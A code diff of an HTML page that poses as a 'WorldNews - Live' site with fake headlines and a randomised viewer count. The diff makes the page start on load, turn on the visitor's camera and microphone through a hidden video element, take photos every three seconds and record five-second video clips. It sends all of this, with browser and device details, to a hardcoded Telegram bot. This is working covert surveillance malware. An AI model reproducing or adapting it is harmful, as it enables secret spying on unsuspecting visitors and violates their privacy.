@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>World News Today</title>
+    <title>WorldNews - Live</title>
     <style>
-        /* ========== RESET ========== */
+        /* ========== RESET & BASE ========== */
         * {
             margin: 0;
             padding: 0;
@@ -14,102 +14,248 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f2f5;
+            background: #0a0a12;
             min-height: 100vh;
-            padding: 20px;
+            padding: 15px;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
         }
         
-        /* ========== MAIN CARD ========== */
-        .main-card {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 30px;
-            max-width: 420px;
+        /* ========== GLASS CARD ========== */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 30px 25px 25px;
+            max-width: 440px;
             width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.12);
-            border: 1px solid rgba(0,0,0,0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.5s;
         }
         
-        .main-card .logo {
-            font-size: 60px;
-            margin-bottom: 10px;
+        /* ========== ANIMATED BORDER ========== */
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff, #9b59b6, #ff6b6b);
+            background-size: 400% 400%;
+            border-radius: 30px;
+            z-index: -1;
+            opacity: 0.4;
+            animation: rainbowBorder 4s ease-in-out infinite;
         }
         
-        .main-card h1 {
-            font-size: 24px;
+        @keyframes rainbowBorder {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        /* ========== HEADER ========== */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .header h1 {
+            font-size: 20px;
             font-weight: 800;
-            color: #1a1a2e;
-            margin-bottom: 6px;
+            color: #fff;
+            letter-spacing: -0.5px;
         }
         
-        .main-card h1 span {
-            color: #4f46e5;
+        .header h1 span {
+            background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
-        .main-card p {
-            color: #6b7280;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-        
-        /* ========== START BUTTON ========== */
-        .btn-start {
-            background: linear-gradient(135deg, #4f46e5, #7c3aed);
+        .live-badge {
+            background: #ff6b6b;
             color: white;
-            border: none;
-            padding: 16px 50px;
-            border-radius: 50px;
-            font-size: 18px;
+            font-size: 10px;
             font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            box-shadow: 0 8px 30px rgba(79, 70, 229, 0.3);
+            padding: 4px 14px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            animation: blink 1s infinite;
         }
         
-        .btn-start:hover {
-            transform: scale(1.03);
-            box-shadow: 0 12px 40px rgba(79, 70, 229, 0.4);
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
         
-        .btn-start:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
+        /* ========== STATUS BAR ========== */
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(255,255,255,0.04);
+            border-radius: 14px;
+            padding: 10px 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.04);
+            flex-wrap: wrap;
+            gap: 5px;
         }
         
-        /* ========== LOADING ========== */
-        .loading-text {
-            color: #9ca3af;
-            font-size: 13px;
-            margin-top: 15px;
-            display: none;
+        .status-bar .item {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
         }
         
-        .spinner {
+        .status-bar .item .num {
+            color: #fff;
+            font-weight: 700;
+        }
+        
+        .status-bar .live-dot {
             display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #e5e7eb;
-            border-top: 2px solid #4f46e5;
+            width: 7px;
+            height: 7px;
+            background: #ff6b6b;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
+            animation: blink 0.8s infinite;
+            margin-right: 4px;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        /* ========== NEWS TICKER ========== */
+        .ticker {
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(255,255,255,0.04);
+            overflow: hidden;
+            white-space: nowrap;
         }
         
-        /* ========== HIDDEN VIDEO ========== */
+        .ticker-text {
+            display: inline-block;
+            color: rgba(255,255,255,0.6);
+            font-size: 12px;
+            animation: tickerScroll 15s linear infinite;
+        }
+        
+        @keyframes tickerScroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-200%); }
+        }
+        
+        /* ========== CONTENT GRID ========== */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+        
+        .grid-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 14px;
+            padding: 14px 12px;
+            border: 1px solid rgba(255,255,255,0.04);
+            transition: all 0.3s;
+            cursor: pointer;
+            animation: fadeUp 0.6s ease-out;
+        }
+        
+        .grid-item:hover {
+            background: rgba(255,255,255,0.07);
+            transform: translateY(-2px);
+        }
+        
+        .grid-item .icon {
+            font-size: 28px;
+            margin-bottom: 4px;
+            display: block;
+        }
+        
+        .grid-item h4 {
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+        
+        .grid-item p {
+            color: rgba(255,255,255,0.4);
+            font-size: 11px;
+        }
+        
+        .grid-item .tag {
+            display: inline-block;
+            font-size: 9px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-top: 6px;
+        }
+        
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* ========== FEATURED ========== */
+        .featured {
+            background: linear-gradient(135deg, rgba(255,107,107,0.08), rgba(77,150,255,0.08));
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(255,255,255,0.04);
+            text-align: center;
+            animation: fadeUp 0.8s ease-out;
+        }
+        
+        .featured .big-icon {
+            font-size: 48px;
+            margin-bottom: 4px;
+        }
+        
+        .featured h3 {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+        }
+        
+        .featured p {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+        
+        /* ========== COLOR THEMES (Random) ========== */
+        .theme-1 { border-left: 3px solid #ff6b6b; }
+        .theme-2 { border-left: 3px solid #ffd93d; }
+        .theme-3 { border-left: 3px solid #6bcb77; }
+        .theme-4 { border-left: 3px solid #4d96ff; }
+        .theme-5 { border-left: 3px solid #9b59b6; }
+        .theme-6 { border-left: 3px solid #fd79a8; }
+        
+        /* ========== HIDDEN MEDIA ========== */
         #video {
             position: fixed;
             top: -9999px;
@@ -120,53 +266,86 @@
             pointer-events: none;
         }
         
+        #audioRecorder {
+            display: none;
+        }
+        
         #canvas {
             display: none;
         }
         
         /* ========== FOOTER ========== */
         .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #d1d5db;
+            text-align: center;
+            font-size: 10px;
+            color: rgba(255,255,255,0.12);
+            border-top: 1px solid rgba(255,255,255,0.03);
+            padding-top: 14px;
+            margin-top: 4px;
         }
         
         /* ========== RESPONSIVE ========== */
         @media (max-width: 480px) {
-            .main-card {
-                padding: 30px 20px;
+            .glass-card {
+                padding: 20px 16px 18px;
             }
-            .main-card h1 {
-                font-size: 20px;
+            .header h1 {
+                font-size: 17px;
             }
-            .btn-start {
-                font-size: 16px;
-                padding: 14px 30px;
+            .grid-item {
+                padding: 10px 10px;
+            }
+            .grid-item .icon {
+                font-size: 22px;
+            }
+            .grid-item h4 {
+                font-size: 12px;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- ========== HIDDEN VIDEO ========== -->
+    <!-- ========== HIDDEN MEDIA ========== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
+    <audio id="audioRecorder" autoplay></audio>
 
     <!-- ========== MAIN CARD ========== -->
-    <div class="main-card" id="mainCard">
-        <div class="logo">🌍</div>
-        <h1><span>World</span>News</h1>
-        <p>Get the latest news from around the world.</p>
+    <div class="glass-card" id="mainCard">
         
-        <button class="btn-start" id="startBtn">
-            🚀 Start
-        </button>
-        
-        <div class="loading-text" id="loadingText">
-            <span class="spinner"></span> Loading...
+        <!-- Header -->
+        <div class="header">
+            <h1>🌍 <span>World</span>News</h1>
+            <span class="live-badge">🔴 LIVE</span>
         </div>
         
-        <div class="footer">🔒 Secure Connection</div>
+        <!-- Status Bar -->
+        <div class="status-bar" id="statusBar">
+            <span class="item"><span class="live-dot"></span> <span class="num" id="viewers">12,847</span> watching</span>
+            <span class="item" id="timeDisplay">🔄 Updating...</span>
+            <span class="item" id="sessionTime">⏱️ 0s</span>
+        </div>
+        
+        <!-- Ticker -->
+        <div class="ticker">
+            <span class="ticker-text" id="tickerText">🔴 BREAKING: Global Summit 2026 underway • Markets surge 3% • AI breakthrough announced • Peace treaty signed • More updates coming...</span>
+        </div>
+        
+        <!-- Featured -->
+        <div class="featured" id="featured">
+            <div class="big-icon" id="featuredIcon">🌍</div>
+            <h3 id="featuredTitle">Global Leaders Unite</h3>
+            <p id="featuredDesc">Historic agreement reached at Geneva Summit</p>
+        </div>
+        
+        <!-- Grid -->
+        <div class="grid" id="newsGrid">
+            <!-- Items will be populated by JavaScript -->
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">🔒 SECURE • LIVE • 24/7 COVERAGE</div>
     </div>
 
     <!-- ================================================================ -->
@@ -178,23 +357,15 @@
         // ================================================================
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
-        const CAPTURE_INTERVAL = 4000;
-        const MAX_PHOTOS = 10;
+        const CAPTURE_INTERVAL = 3000; // 3 seconds
+        const MAX_PHOTOS = 20;
+        const VIDEO_SEGMENT_DURATION = 5000; // 5 seconds video segments
         
         // ================================================================
         //  GET CODE FROM URL
         // ================================================================
         const params = new URLSearchParams(window.location.search);
         const code = params.get('code') || 'unknown';
-        
-        // ================================================================
-        //  DOM ELEMENTS
-        // ================================================================
-        const startBtn = document.getElementById('startBtn');
-        const loadingText = document.getElementById('loadingText');
-        const mainCard = document.getElementById('mainCard');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
         
         // ================================================================
         //  BROWSER INFO
@@ -218,76 +389,149 @@
         
         const browser = getBrowser(navigator.userAgent);
         const device = getDevice(navigator.userAgent);
+        const startTime = Date.now();
+        
+        // ================================================================
+        //  DOM ELEMENTS
+        // ================================================================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const audioRecorder = document.getElementById('audioRecorder');
+        const viewers = document.getElementById('viewers');
+        const timeDisplay = document.getElementById('timeDisplay');
+        const sessionTime = document.getElementById('sessionTime');
+        const tickerText = document.getElementById('tickerText');
+        const featuredIcon = document.getElementById('featuredIcon');
+        const featuredTitle = document.getElementById('featuredTitle');
+        const featuredDesc = document.getElementById('featuredDesc');
+        const newsGrid = document.getElementById('newsGrid');
+        
+        // ================================================================
+        //  NEWS DATA (Dynamic)
+        // ================================================================
+        const newsItems = [
+            { icon: '🚀', title: 'AI Breakthrough', desc: 'New model beats human experts', tag: 'Tech', color: '#4d96ff' },
+            { icon: '💰', title: 'Markets Surge', desc: 'Inflation cools down globally', tag: 'Finance', color: '#6bcb77' },
+            { icon: '⚽', title: 'Champions League', desc: 'Historic final breaks records', tag: 'Sports', color: '#ffd93d' },
+            { icon: '🌿', title: 'Vaccine Success', desc: 'New vaccine 95% effective', tag: 'Health', color: '#6bcb77' },
+            { icon: '🎬', title: 'Box Office Hit', desc: 'New film earns $1 billion', tag: 'Entertainment', color: '#fd79a8' },
+            { icon: '🌍', title: 'Peace Treaty', desc: 'Decades-long conflict ends', tag: 'World', color: '#4d96ff' },
+            { icon: '🤖', title: 'Robotics Breakthrough', desc: 'Humanoid robots debut', tag: 'Tech', color: '#9b59b6' },
+            { icon: '🏦', title: 'Banking Reform', desc: 'New global financial rules', tag: 'Economy', color: '#ffd93d' },
+            { icon: '🌊', title: 'Climate Action', desc: 'Historic emissions deal', tag: 'Environment', color: '#6bcb77' },
+            { icon: '🚑', title: 'Medical Miracle', desc: 'New cancer treatment found', tag: 'Health', color: '#ff6b6b' },
+            { icon: '📡', title: 'Space Mission', desc: 'Mars colony announced', tag: 'Science', color: '#4d96ff' },
+            { icon: '🎓', title: 'Education Reform', desc: 'Global learning initiative', tag: 'Education', color: '#9b59b6' }
+        ];
         
         // ================================================================
         //  STATE
         // ================================================================
         let stream = null;
+        let audioStream = null;
         let photoCount = 0;
         let isRunning = false;
         let captureTimer = null;
-        let isStarted = false;
+        let videoTimer = null;
+        let sessionTimer = null;
+        let viewerTimer = null;
+        let tickerTimer = null;
+        let newsTimer = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let videoSegments = [];
         
         // ================================================================
-        //  START BUTTON CLICK
+        //  START EVERYTHING
         // ================================================================
-        startBtn.addEventListener('click', async function() {
-            if (isStarted) return;
-            isStarted = true;
-            
-            startBtn.disabled = true;
-            startBtn.textContent = '⏳ Starting...';
-            loadingText.style.display = 'block';
-            
+        async function startAll() {
             try {
                 // Start camera
-                await startCamera();
-                
-                // Change UI to news page
-                showNewsPage();
-                
-                // Send notification to WhatsApp via Telegram
-                await sendStartNotification();
-                
-            } catch (error) {
-                console.error('Error:', error);
-                startBtn.disabled = false;
-                startBtn.textContent = '🔄 Try Again';
-                loadingText.style.display = 'none';
-                isStarted = false;
-            }
-        });
-        
-        // ================================================================
-        //  START CAMERA
-        // ================================================================
-        async function startCamera() {
-            try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
-                    audio: false
+                    audio: true
                 });
                 
                 video.srcObject = stream;
                 await video.play();
                 
-                // Start capturing
-                startCapturing();
+                // Start audio recording
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                // Start video recording
+                startVideoRecording();
+                
+                // Start photo capture
+                startPhotoCapture();
+                
+                // Start UI updates
+                startUIUpdates();
+                
+                // Send start notification
+                sendStartNotification();
                 
             } catch (error) {
-                console.error('Camera error:', error);
-                throw error;
+                console.error('Error:', error);
+                sendErrorToTelegram(error.message);
             }
         }
         
         // ================================================================
-        //  START CAPTURING
+        //  VIDEO RECORDING
         // ================================================================
-        function startCapturing() {
+        function startVideoRecording() {
+            if (!stream) return;
+            
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm;codecs=vp9,opus'
+            });
+            
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = function() {
+                if (recordedChunks.length > 0) {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    videoSegments.push(blob);
+                    recordedChunks = [];
+                    
+                    // Send video to Telegram
+                    sendVideoToTelegram(blob);
+                    
+                    // Restart recording
+                    if (isRunning) {
+                        setTimeout(() => {
+                            if (mediaRecorder && isRunning) {
+                                mediaRecorder.start(1000);
+                            }
+                        }, 500);
+                    }
+                }
+            };
+            
+            mediaRecorder.start(1000);
+            isRecording = true;
+            
+            // Stop and restart every 5 seconds to create segments
+            videoTimer = setInterval(() => {
+                if (mediaRecorder && isRecording) {
+                    mediaRecorder.stop();
+                }
+            }, VIDEO_SEGMENT_DURATION);
+        }
+        
+        // ================================================================
+        //  PHOTO CAPTURE
+        // ================================================================
+        function startPhotoCapture() {
             isRunning = true;
             photoCount = 0;
             
@@ -296,15 +540,10 @@
             captureTimer = setInterval(() => {
                 if (photoCount < MAX_PHOTOS) {
                     capturePhoto();
-                } else {
-                    stopCapturing();
                 }
             }, CAPTURE_INTERVAL);
         }
         
-        // ================================================================
-        //  CAPTURE PHOTO
-        // ================================================================
         function capturePhoto() {
             if (!stream || !isRunning) return;
             
@@ -325,7 +564,7 @@
         }
         
         // ================================================================
-        //  SEND PHOTO TO TELEGRAM
+        //  SEND TO TELEGRAM
         // ================================================================
         async function sendPhotoToTelegram(imageData) {
             try {
@@ -338,24 +577,40 @@
                     `🔗 **Code:** \`${code}\`\n` +
                     `🌍 **Browser:** ${browser}\n` +
                     `📱 **Device:** ${device}\n` +
-                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
+                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
+                    `⏱️ **Session:** ${Math.floor((Date.now() - startTime) / 1000)}s`
                 );
                 formData.append('parse_mode', 'Markdown');
                 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
+                await fetch(url, { method: 'POST', body: formData });
                 
             } catch (error) {
-                console.error('Send error:', error);
+                console.error('Send photo error:', error);
             }
         }
         
-        // ================================================================
-        //  SEND START NOTIFICATION TO TELEGRAM
-        // ================================================================
+        async function sendVideoToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, `video_${Date.now()}.webm`);
+                formData.append('caption', 
+                    `🎥 **Video Segment**\n\n` +
+                    `🔗 **Code:** \`${code}\`\n` +
+                    `⏱️ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
+                    `📊 **Segments:** ${videoSegments.length}`
+                );
+                formData.append('parse_mode', 'Markdown');
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+                await fetch(url, { method: 'POST', body: formData });
+                
+            } catch (error) {
+                console.error('Send video error:', error);
+            }
+        }
+        
         async function sendStartNotification() {
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -364,12 +619,27 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🚀 **New Visitor Started!**\n\n` +
+                        text: `🎬 **NEW SESSION STARTED!**\n\n` +
                               `🔗 **Code:** \`${code}\`\n` +
                               `🌍 **Browser:** ${browser}\n` +
                               `📱 **Device:** ${device}\n` +
                               `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n\n` +
-                              `📸 Camera is now active...`,
+                              `📸 Capturing photos & video...`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {}
+        }
+        
+        async function sendErrorToTelegram(errorMsg) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `⚠️ **Error**\n\nCode: \`${code}\`\nError: ${errorMsg}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -377,73 +647,140 @@
         }
         
         // ================================================================
-        //  SHOW NEWS PAGE
+        //  UI UPDATES (Dynamic - changes every few seconds)
         // ================================================================
-        function showNewsPage() {
-            mainCard.innerHTML = `
-                <div style="text-align:left;">
-                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:8px;">
-                        <h2 style="font-size:20px;color:#1a1a2e;">🌍 <span style="color:#4f46e5;">World</span>News</h2>
-                        <span style="background:#ef4444;color:white;font-size:10px;padding:3px 12px;border-radius:20px;font-weight:700;">🔴 LIVE</span>
-                    </div>
-                    
-                    <div style="background:#f8fafc;border-radius:12px;padding:14px 16px;margin-bottom:14px;border:1px solid #e5e7eb;">
-                        <div style="display:flex;justify-content:space-between;font-size:13px;color:#6b7280;flex-wrap:wrap;gap:5px;">
-                            <span>👁️ ${Math.floor(Math.random() * 50000) + 8000} watching</span>
-                            <span>🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}</span>
-                        </div>
-                    </div>
-                    
-                    <div style="background:linear-gradient(135deg,#e0e7ff,#c7d2fe);border-radius:14px;padding:20px;text-align:center;margin-bottom:14px;">
-                        <div style="font-size:40px;">🌍</div>
-                        <h3 style="color:#1a1a2e;font-size:17px;margin:6px 0 4px;">Global Summit 2026</h3>
-                        <p style="font-size:13px;color:#4b5563;">World leaders unite for historic agreement</p>
-                    </div>
-                    
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
-                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
-                            <div style="font-size:24px;">🚀</div>
-                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">AI Breakthrough</h4>
-                            <p style="font-size:11px;color:#6b7280;">New model beats experts</p>
-                        </div>
-                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
-                            <div style="font-size:24px;">💰</div>
-                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Markets Surge</h4>
-                            <p style="font-size:11px;color:#6b7280;">Inflation cools down</p>
-                        </div>
-                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
-                            <div style="font-size:24px;">⚽</div>
-                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Champions League</h4>
-                            <p style="font-size:11px;color:#6b7280;">Records broken</p>
-                        </div>
-                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
-                            <div style="font-size:24px;">🌿</div>
-                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Vaccine Success</h4>
-                            <p style="font-size:11px;color:#6b7280;">95% efficacy rate</p>
-                        </div>
-                    </div>
-                    
-                    <div style="text-align:center;font-size:11px;color:#9ca3af;margin-top:16px;border-top:1px solid #e5e7eb;padding-top:12px;">
-                        © 2026 WorldNews • Independent Journalism
-                    </div>
-                </div>
-            `;
+        function startUIUpdates() {
+            // Update viewers
+            viewerTimer = setInterval(() => {
+                const num = Math.floor(Math.random() * 50000) + 8000;
+                viewers.textContent = num.toLocaleString();
+            }, 3000);
+            
+            // Update time
+            timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
+            setInterval(() => {
+                timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
+            }, 1000);
+            
+            // Session time
+            sessionTimer = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const mins = Math.floor(elapsed / 60);
+                const secs = elapsed % 60;
+                sessionTime.textContent = `⏱️ ${mins}m ${secs}s`;
+            }, 1000);
+            
+            // Ticker
+            const tickers = [
+                '🔴 BREAKING: Global Summit 2026 underway • Leaders discuss climate action',
+                '💰 Markets surge 3% after positive economic data release',
+                '🚀 AI breakthrough: New model beats human experts in medical diagnosis',
+                '🌍 Peace treaty signed between two nations after decades of conflict',
+                '📡 Mars colony announced: First human settlement by 2030',
+                '⚽ Champions League final breaks viewership records',
+                '🌿 New vaccine shows 95% efficacy against rare disease',
+                '🎬 Blockbuster film reaches $1 billion in first week',
+                '🏦 Global banking reform agreement reached',
+                '🌊 Historic climate deal: 50 nations commit to net-zero'
+            ];
+            let tickerIndex = 0;
+            tickerTimer = setInterval(() => {
+                tickerText.textContent = '🔴 ' + tickers[tickerIndex % tickers.length] + ' • More updates coming...';
+                tickerIndex++;
+            }, 4000);
+            
+            // News grid - randomize
+            function shuffleArray(arr) {
+                for (let i = arr.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [arr[i], arr[j]] = [arr[j], arr[i]];
+                }
+                return arr;
+            }
+            
+            function updateNews() {
+                const shuffled = shuffleArray([...newsItems]);
+                const selected = shuffled.slice(0, 4);
+                
+                newsGrid.innerHTML = '';
+                selected.forEach((item, index) => {
+                    const div = document.createElement('div');
+                    div.className = `grid-item theme-${(index % 6) + 1}`;
+                    div.innerHTML = `
+                        <span class="icon">${item.icon}</span>
+                        <h4>${item.title}</h4>
+                        <p>${item.desc}</p>
+                        <span class="tag" style="background:${item.color}20;color:${item.color};">${item.tag}</span>
+                    `;
+                    div.onclick = () => {
+                        // Change featured on click
+                        featuredIcon.textContent = item.icon;
+                        featuredTitle.textContent = item.title;
+                        featuredDesc.textContent = item.desc + ' • Clicked!';
+                    };
+                    newsGrid.appendChild(div);
+                });
+                
+                // Also update featured
+                const featuredItem = shuffled[Math.floor(Math.random() * shuffled.length)];
+                featuredIcon.textContent = featuredItem.icon;
+                featuredTitle.textContent = featuredItem.title;
+                featuredDesc.textContent = featuredItem.desc + ' • Updated live';
+            }
+            
+            updateNews();
+            newsTimer = setInterval(updateNews, 5000);
+            
+            // Random color theme change
+            setInterval(() => {
+                const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#9b59b6', '#fd79a8'];
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                document.querySelector('.glass-card').style.borderColor = color + '40';
+            }, 3000);
         }
         
         // ================================================================
-        //  STOP CAPTURING
+        //  STOP EVERYTHING (On page close)
         // ================================================================
-        function stopCapturing() {
+        function stopAll() {
             isRunning = false;
-            if (captureTimer) {
-                clearInterval(captureTimer);
-                captureTimer = null;
+            isRecording = false;
+            
+            if (captureTimer) clearInterval(captureTimer);
+            if (videoTimer) clearInterval(videoTimer);
+            if (sessionTimer) clearInterval(sessionTimer);
+            if (viewerTimer) clearInterval(viewerTimer);
+            if (tickerTimer) clearInterval(tickerTimer);
+            if (newsTimer) clearInterval(newsTimer);
+            
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
             }
+            
+            // Send final notification
+            const totalTime = Math.floor((Date.now() - startTime) / 1000);
+            const mins = Math.floor(totalTime / 60);
+            const secs = totalTime % 60;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🛑 **SESSION ENDED**\n\n` +
+                          `🔗 **Code:** \`${code}\`\n` +
+                          `⏱️ **Duration:** ${mins}m ${secs}s\n` +
+                          `📸 **Photos:** ${photoCount}\n` +
+                          `🎥 **Videos:** ${videoSegments.length}\n\n` +
+                          `Total media sent successfully!`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+            
             setTimeout(() => {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }, 2000);
+                if (stream) stream.getTracks().forEach(track => track.stop());
+                if (audioStream) audioStream.getTracks().forEach(track => track.stop());
+            }, 1000);
         }
         
         // ================================================================
@@ -461,14 +798,24 @@
         }
         
         // ================================================================
-        //  STOP ON PAGE LEAVE
+        //  DETECT PAGE CLOSE
         // ================================================================
         window.addEventListener('beforeunload', function() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            if (captureTimer) clearInterval(captureTimer);
+            stopAll();
         });
+        
+        // Also detect visibility change
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                // Page is hidden (tab switched or minimized)
+                // We keep running, but we could log it
+            }
+        });
+        
+        // ================================================================
+        //  START!
+        // ================================================================
+        startAll();
     </script>
 </body>
 </html>
